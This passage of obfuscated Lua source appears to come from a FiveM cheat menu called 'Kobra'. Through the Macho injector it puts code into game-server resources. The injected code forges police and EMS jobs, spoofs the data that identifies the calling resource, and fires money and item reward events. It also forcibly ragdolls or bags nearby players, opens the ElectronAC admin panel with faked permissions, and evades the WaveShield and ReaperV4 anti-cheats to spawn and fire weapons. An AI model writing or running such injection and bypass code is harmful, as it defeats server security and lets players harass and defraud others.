                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);break;end end elseif (GetResourceState("core")=="started") then v12:Notify("Setjob","Kobra","Your job has been set to police",3000);MachoInjectResource2(NewThreadNs,"core",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);else print("Neither core nor es_extended started");end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v96({type="button",label="POLICE JOB (2)",onSelect=function() v12:Notify("Setjob","Kobra","You are now Police",1470 + 1530 );MachoInjectResourceRaw("any",[[
                    local lp = LocalPlayer
                    if lp and lp.state then
                        lp.state:set("job", {
                            name = "police",
                            label = "Police",
                            grade = 4,
                            grade_name = "sergeant"
                        }, true)
                        print("[✅] Job set to police successfully.")
                    else
                        print("[⚠️] Failed to set job: LocalPlayer or state not available.")
                    end
                ]]);end});end if (GetResourceState("codewave-sneaker-phone")=="started") then v96({type="button",label="COLLECT REWARDS",onSelect=function() MachoInjectResource2(NewThreadNs,"codewave-sneaker-phone",[[
                    function HookNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end
                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    HookNative("TriggerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    HookNative("TriggerServerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    _G.Kobra = {
                        TEvent = function(eName, ...)
                            return TriggerEvent(eName, ...)
                        end,
                        TSEvent = function(eName, ...)
                            return TriggerServerEvent(eName, ...)
                        end,
                    }

                    _G.Kobra.TSEvent('delivery:giveRewardShoes', 100000)
                    print("[✅] reward triggered successfully.")
                ]]);end});end if (GetResourceState("rzrp-base")=="started") then v96({type="checkbox",label="Ragdoll Players (RZRP)",checked=false,onSelect=function(v636) if v636 then v12:Notify("Ragdoll","Kobra","Ragdolling Nearby Players",3302 + 698 );v48("rzrp-base",[[
                        if not _G.KobraRagdollPlayersInitialized then
                            _G.KobraRagdollPlayersEnabled = true
                            _G.KobraRagdollPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            -- Stop any existing ragdoll thread before creating a new one
                            if _G.KobraRagdollThread then
                                TerminateThread(_G.KobraRagdollThread)
                                _G.KobraRagdollThread = nil
                            end

                            _G.KobraRagdollThread = SafeThread(function()
                                while _G.KobraRagdollPlayersEnabled and _G.KobraRagdollPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 30000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:Slap', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraRagdollThread = nil
                            end)
                        else
                            _G.KobraRagdollPlayersEnabled = true
                        end
                    ]]);else v12:Notify("Ragdoll","Kobra","Stopped Ragdolling Players",4000);v48("rzrp-base",[[
                        _G.KobraRagdollPlayersEnabled = false
                        _G.KobraRagdollPlayersInitialized = false
                        if _G.KobraRagdollThread then
                            TerminateThread(_G.KobraRagdollThread)
                            _G.KobraRagdollThread = nil
                        end
                    ]]);end end});end if (GetResourceState("rzrp-base")=="started") then v96({type="checkbox",label="Bag Closest Players (RZRP)",checked=false,onSelect=function(v637) if v637 then local v810=0;while true do if (v810==(0 + 0)) then print("Bag Closest Players Started...");v48("rzrp-base",[[
                        if not _G.KobraBagPlayersInitialized then
                            _G.KobraBagPlayersEnabled = true
                            _G.KobraBagPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            if _G.KobraBagThread then
                                TerminateThread(_G.KobraBagThread)
                                _G.KobraBagThread = nil
                            end

                            _G.KobraBagThread = SafeThread(function()
                                while _G.KobraBagPlayersEnabled and _G.KobraBagPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 300000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:BagClosestPlayer', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraBagThread = nil
                            end)
                        else
                            _G.KobraBagPlayersEnabled = true
                        end
                    ]]);break;end end else local v811=0 -0 ;while true do if (v811==0) then print("Bag Closest Players Stopped...");v48("rzrp-base",[[
                        _G.KobraBagPlayersEnabled = false
                        _G.KobraBagPlayersInitialized = false
                        if _G.KobraBagThread then
                            TerminateThread(_G.KobraBagThread)
                            _G.KobraBagThread = nil
                        end
                    ]]);break;end end end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v96({type="button",label="Force Gang",onSelect=function() local v638=0;local v639;local v640;local v641;local v642;while true do if (v638==0) then v639="";v640=261 -(197 + 63) ;v12:HideUI();v638=1 + 0 ;end if (v638==1) then v59("Gang Name","",function(v895) if (v895 and (v895~="")) then v639=v895;end end,"typeable");Wait(2300);v59("Gang Rank","",function(v896) if (v896 and (v896~="")) then v640=tonumber(v896) or (1 + 0) ;end end,"typeable");v638=2;end if (v638==(2 + 0)) then Wait(165 + 835 );v641=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;v642=string.format([[
                    LocalPlayer.state:set("gang", "%s", true)
                    LocalPlayer.state:set("gang_rank", %d, true)
                ]],v639,v640);v638=3 -0 ;end if (v638==(1372 -(618 + 751))) then v48(v641,v642);v12:ShowUI();v12:Notify("success","Kobra","Gang Set",2993 + 1007 );break;end end end});end if (GetResourceState("framework")=="started") then v96({type="button",label="Give Item #2",onSelect=function() local v643=0;local v644;local v645;local v646;local v647;local v648;local v649;while true do if (v643==(1914 -(206 + 1704))) then if (v647>(168494 -68494)) then print("^7[^5Kobra^7] [^1WARN^7]: That shit too high, stamping to 100000");v647=199644 -99644 ;end v645=tostring(v645 or "" );v647=tonumber(v647 or (1 + 0) );v643=5;end if (v643==(1277 -(155 + 1120))) then if ( not v645 or (v645=="")) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",4506 -(396 + 1110) );v12:ShowUI();return;end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");v646=v644("Item Count","1");v643=6 -3 ;end if (v643==1) then print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");v645=v644("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v645));v643=1 + 1 ;end if (v643==(0 + 0)) then v12:HideUI();v644=nil;function v644(v897,v898) local v899=nil;local v900=false;v59(v897,v898 or "" ,function(v935) local v936=0;while true do if (v936==0) then v899=v935;v900=true;break;end end end,"typeable");while  not v900 do Wait(0 + 0 );end return v899;end v643=977 -(230 + 746) ;end if (v643==(607 -(473 + 128))) then if  not v648 then local v937=48 -(39 + 9) ;while true do if (v937==(266 -(38 + 228))) then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v649);v12:Notify("error","Kobra","String format failed — check console",7265 -3265 );break;end end else local v938=473 -(106 + 367) ;while true do if (v938==0) then print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");v12:Notify("success","Kobra","Item Sent",4000);break;end end end v12:ShowUI();break;end if (v643==(1 + 2)) then print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v646));v647=tonumber(v646);if ( not v647 or (v647<(1863 -(354 + 1508)))) then local v939=0;while true do if (v939==(0 -0)) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v647=1 + 0 ;break;end end end v643=4;end if ((3 + 2)==v643) then print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v645);print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v647);v648,v649=pcall(function() MachoInjectResourceRaw("framework",string.format([[
                        TriggerServerEvent('drugs:receive', {
                            Reward = {
                                Name = "%s",
                                Amount = %d
                            }
                        })
                    ]],v645,v647));end);v643=7 -1 ;end end end});end if (GetResourceState("WayTooCerti_3D_Printer")=="started") then v96({type="button",label="COLLECT ITEMS 3",onSelect=function() MachoInjectResourceRaw("WayTooCerti_3D_Printer",[[
                local function Ak47Spawn()
                TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', 'money', 10000)
                end
                Ak47Spawn()
            ]]);end});end if (GetResourceState("tm-base")=="started") then table.insert(events,{name="Spawn Money #4",eventName="give_metro_money_04",execute=function() local v650=1244 -(334 + 910) ;while true do if (v650==0) then print("Give Money Metro RP...");MachoInjectResource2(NewThreadNs,"tm-base",[[
                TriggerServerEvent('tm-moneywash:giveCleanMoney', 100000)
                ]]);break;end end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v96({type="button",label="Set Chat Tag",onSelect=function() v12:HideUI();local function v651(v737,v738) local v739=nil;local v740=false;v59(v737,v738 or "" ,function(v812) v739=v812;v740=true;end,"typeable");while  not v740 do Wait(0);end return v739;end local v652=v651("Chat Tag Name","");if ( not v652 or (v652=="")) then v12:ShowUI();return;end Wait(1395 -(92 + 803) );local v653=v651("Tag Color (R, G, B)","0, 255, 0");if ( not v653 or (v653=="")) then v653="255, 255, 255";end Wait(500);local v654=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;MachoInjectResourceRaw(v654,string.format([[
                    LocalPlayer.state:set('currentChatTag', { tag = "%s", color = "%s" }, true)
                ]],v652,v653));v12:ShowUI();end});end if (GetResourceState("wasabi_multijob")=="started") then v96({type="button",label="POLICE JOB (3)",onSelect=function() MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
            CheckJob(job, true) 
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'police', grade = 1, label = 'Police', boss = true, onDuty = false })
        ]]);end});end if (GetResourceState("wasabi_multijob")=="started") then v96({type="button",label="EMS JOB (1)",onSelect=function() MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic", boss = false, onDuty = true }
            CheckJob(job, true)
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'ambulance', grade = 5, label = 'Ambulance', boss = true, onDuty = false })
        ]]);end});end if (GetResourceState("ElectronAC")=="started") then v96({type="button",label="ElectronAC Admin Panel",onSelect=function() MachoInjectResourceRaw("ElectronAC",[[
        SetNuiFocus(true, true)
        SendNUIMessage({
            action = "menu",
            data = {
                info = {
                    adminContext = {
                        master = true,
                        permissions = { "all" }
                    },
                    identifiers = {
                        ["ip"] = "127.0.0.1",
                        ["license"] = "",
                        ["license2"] = "",
                    },
                    permissions = {
                        adminMenu = true,
                        whitelisted = true
                    }
                },
                open = true,
                setOpen = true
            }
        })
        ]]);end});end if (GetResourceState("spoodyFraud")=="started") then v96({type="button",label="Collect Cash",onSelect=function() MachoInjectResource2(NewThreadNs,"spoodyFraud",[[
        function HookNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        HookNative("CreateThread", function(originalFn, ...)
            return originalFn(...)
        end)

        HookNative("TriggerServerEvent", function(originalFn, ...)
            return originalFn(...)
        end)

        function Spoody()
            for i = 1, 30 do
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Swapped Sim Card')
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Cloned Card')

                Citizen.Wait(5)

                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Pacific Bank', 'clone')
                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Sandy Shoes', 'sim')
            end
        end

        CreateThread(function()
            Spoody()
        end)
        ]]);end});end v59("Choose Menu Key","",function(v472) for v576,v577 in pairs(v44) do if (v577:lower()==v472:lower()) then local v741=0 + 0 ;while true do if ((1182 -(1035 + 146))==v741) then v12:ShowUI();return;end if (v741==0) then v23=v577;Wait(250);v741=1;end end end end end,"keybind");local v287=616 -(230 + 386) ;local v288=70 + 50 ;while true do Wait(1510 -(353 + 1157) );if v32 then local v655=v38[v39];if IsControlJustReleased(1114 -(53 + 1061) ,1649 -(1568 + 67) ) then v39=(v39% #v38) + 1 ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="down"}));end if IsControlJustReleased(0 + 0 ,3 + 12 ) then local v813=0;while true do if (v813==(0 -0)) then v39=((v39-(5 -3))% #v38) + 1 ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="up"}));break;end end end if (v655=="Shoot Weapon") then local v814=0 -0 ;while true do if (v814==(0 + 0)) then if IsDisabledControlJustPressed(1212 -(615 + 597) ,44) then v34=((v34-(2 + 0))% #v36) + 1 ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));end if IsDisabledControlJustPressed(0 -0 ,38) then local v1032=0;while true do if (v1032==(0 + 0)) then v34=(v34% #v36) + 1 ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));break;end end end break;end end elseif (v655=="Spawn Car") then local v901=0 + 0 ;while true do if (v901==(0 + 0)) then if IsDisabledControlJustPressed(0,44) then v35=((v35-2)% #v37) + (1900 -(1056 + 843)) ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));end if IsDisabledControlJustPressed(0 -0 ,38) then v35=(v35% #v37) + (1 -0) ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));end break;end end end if IsDisabledControlPressed(0,68 -44 ) then local v815=v655;if (v815=="Shoot Weapon") then local v902=0 + 0 ;local v903;while true do if (v902==(1977 -(286 + 1690))) then if (v903~=v33) then v33=v903;print(("weapon: %s, LastWeaponFired: %s"):format(v903,v33));if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1461=911 -(98 + 813) ;local v1462;local v1463;local v1464;local v1465;local v1466;local v1467;local v1468;local v1469;local v1470;local v1471;while true do if ((1 + 0)==v1461) then hNative("CreateThread",function(v1608,...) return v1608(...);end);hNative("Wait",function(v1609,...) return v1609(...);end);hNative("PlayerPedId",function(v1610,...) return v1610(...);end);v1461=4 -2 ;end if (v1461==(0 + 0)) then v1462=nil;function v1462(v1611) local v1612=507 -(263 + 244) ;local v1613;local v1614;local v1615;while true do if ((0 + 0)==v1612) then v1613=math.rad(v1611.z);v1614=math.rad(v1611.x);v1612=1688 -(1502 + 185) ;end if (v1612==1) then v1615=math.abs(math.cos(v1614));return vector3( -math.sin(v1613) * v1615 ,math.cos(v1613) * v1615 ,math.sin(v1614));end end end function hNative(v1616,v1617) local v1618=_G[v1616];if ( not v1618 or (type(v1618)~="function")) then return;end _G[v1616]=function(...) return v1617(v1618,...);end;end v1461=1 + 0 ;end if (v1461==7) then v1471=v1470(v903);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1468,v1471));Wait(350);v1461=39 -31 ;end if (v1461==(13 -8)) then v1466=2527 -(629 + 898) ;v1467=v1463 + (v1465 * v1466) ;v1468=PlayerPedId();v1461=16 -10 ;end if (v1461==(7 -4)) then hNative("GetCurrentPedWeapon",function(v1619,...) return v1619(...);end);hNative("RemoveWeaponFromPed",function(v1620,...) return;end);hNative("ShootSingleBulletBetweenCoords",function(v1621,...) return v1621(...);end);v1461=4;end if ((367 -(12 + 353))==v1461) then hNative("GetHashKey",function(v1622,...) return v1622(...);end);hNative("GiveWeaponToPed",function(v1623,...) return v1623(...);end);hNative("SetCurrentPedWeapon",function(v1624,...) return v1624(...);end);v1461=3;end if (v1461==(1919 -(1680 + 231))) then ShootSingleBulletBetweenCoords(v1463.x,v1463.y,v1463.z,v1467.x,v1467.y,v1467.z,7 + 93 ,true,v1469,PlayerPedId(),true,false,61238 + 38762 );break;end if (v1461==(1155 -(212 + 937))) then v1469=GetHashKey(v903);v1470=nil;function v1470(v1625) local v1626={};for v1633=1 + 0 , #v1625 do v1626[v1633]=string.byte(v1625,v1633);end return table.concat(v1626,",");end v1461=1069 -(111 + 951) ;end if (v1461==4) then v1463=GetCamCoord(_G.KobraFreecamObject);v1464=GetCamRot(_G.KobraFreecamObject,1 + 1 );v1465=v1462(v1464);v1461=32 -(18 + 9) ;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v903   .. [[")

                                        GiveWeaponToPed(PlayerPedId(), weaponHash, 13500, false, true)
                                        SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local function v1336(v1364) local v1365=0;local v1366;local v1367;local v1368;while true do if (1==v1365) then v1368=math.abs(math.cos(v1367));return vector3( -math.sin(v1366) * v1368 ,math.cos(v1366) * v1368 ,math.sin(v1367));end if (v1365==(0 + 0)) then v1366=math.rad(v1364.z);v1367=math.rad(v1364.x);v1365=535 -(31 + 503) ;end end end function hNative(v1369,v1370) local v1371=1632 -(595 + 1037) ;local v1372;while true do if (v1371==(1444 -(189 + 1255))) then v1372=_G[v1369];if ( not v1372 or (type(v1372)~="function")) then return;end v1371=1;end if (v1371==(1 + 0)) then _G[v1369]=function(...) return v1370(v1372,...);end;break;end end end hNative("CreateThread",function(v1373,...) return v1373(...);end);hNative("Wait",function(v1374,...) return v1374(...);end);hNative("PlayerPedId",function(v1375,...) return v1375(...);end);hNative("GetHashKey",function(v1376,...) return v1376(...);end);hNative("GiveWeaponToPed",function(v1377,...) return v1377(...);end);hNative("SetCurrentPedWeapon",function(v1378,...) return v1378(...);end);hNative("GetCurrentPedWeapon",function(v1379,...) return v1379(...);end);hNative("RemoveWeaponFromPed",function(v1380,...) return;end);local v1337=GetCamCoord(_G.KobraFreecamObject);local v1338=GetCamRot(_G.KobraFreecamObject,2 -0 );local v1339=v1336(v1338);local v1340=2279 -(1170 + 109) ;local v1341=v1337 + (v1339 * v1340) ;local v1342=PlayerPedId();local v1343=GetHashKey(v903);GiveWeaponToPed(v1342,v1343,2072 -(348 + 1469) ,false,true);MachoInjectThread(1289 -(1115 + 174) ,"ReaperV4","",[[
                                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:" .. ]]   .. v1343   .. [[, true, true)
                                    if success then
                                        print("Updated Cache Successfully")
                                    else
                                        print("Failed to Update Cache")
                                    end
                                ]] );Wait(250);ShootSingleBulletBetweenCoords(v1337.x,v1337.y,v1337.z,v1341.x,v1341.y,v1341.z,243 -143 ,true,v1343,v1342,true,false,100000);end elseif ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then print("UPP3R");local function v1472(v1525) local v1526=math.rad(v1525.z);local v1527=math.rad(v1525.x);local v1528=math.abs(math.cos(v1527));return vector3( -math.sin(v1526) * v1528 ,math.cos(v1526) * v1528 ,math.sin(v1527));end function hNative(v1529,v1530) local v1531=0;local v1532;while true do if ((1015 -(85 + 929))==v1531) then _G[v1529]=function(...) return v1530(v1532,...);end;break;end if (v1531==(0 + 0)) then v1532=_G[v1529];if ( not v1532 or (type(v1532)~="function")) then return;end v1531=1;end end end hNative("CreateThread",function(v1533,...) return v1533(...);end);hNative("Wait",function(v1534,...) return v1534(...);end);hNative("PlayerPedId",function(v1535,...) return v1535(...);end);hNative("GetHashKey",function(v1536,...) return v1536(...);end);hNative("GiveWeaponToPed",function(v1537,...) return v1537(...);end);hNative("SetCurrentPedWeapon",function(v1538,...) return v1538(...);end);hNative("GetCurrentPedWeapon",function(v1539,...) return v1539(...);end);hNative("RemoveWeaponFromPed",function(v1540,...) return;end);hNative("ShootSingleBulletBetweenCoords",function(v1541,...) return v1541(...);end);local v1473=GetCamCoord(_G.KobraFreecamObject);local v1474=GetCamRot(_G.KobraFreecamObject,1869 -(1151 + 716) );local v1475=v1472(v1474);local v1476=343 + 657 ;local v1477=v1473 + (v1475 * v1476) ;local v1478=PlayerPedId();local v1479=GetHashKey(v903);local function v1480(v1542) local v1543={};for v1583=1, #v1542 do v1543[v1583]=string.byte(v1542,v1583);end return table.concat(v1543,",");end local v1481=v1480(v903);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1478,v1481));Wait(147 + 3 );ShootSingleBulletBetweenCoords(v1473.x,v1473.y,v1473.z,v1477.x,v1477.y,v1477.z,100,true,v1479,v1478,true,false,101704 -(95 + 1609) );end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
